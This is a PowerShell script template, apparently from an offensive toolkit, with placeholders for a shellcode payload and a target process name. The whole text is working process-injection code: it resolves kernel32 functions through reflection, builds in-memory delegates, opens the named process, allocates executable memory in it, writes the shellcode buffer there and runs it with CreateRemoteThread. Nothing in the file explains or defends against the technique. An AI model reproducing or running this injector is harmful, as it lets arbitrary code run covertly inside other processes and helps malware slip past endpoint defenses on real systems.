{{PAYLOAD}}

function GetProcAddress {
	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function delegate {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delegationType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('DelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delegationType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$procId = (Get-Process "{{PROCESS}}").Id[0]

$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress kernel32.dll OpenProcess), (delegate @([UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, 0, $procId)

$addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress kernel32.dll VirtualAllocEx),  (delegate @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, [UInt32]$buf.Length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress kernel32.dll WriteProcessMemory), (delegate @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr])([Bool]))).Invoke($hProcess, $addr, $buf, [Uint32]$buf.Length, [IntPtr]::Zero)   

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress kernel32.dll CreateRemoteThread), (delegate @([IntPtr], [IntPtr], [UInt32], [IntPtr], [UInt32], [IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0, $addr, 0, [IntPtr]::Zero)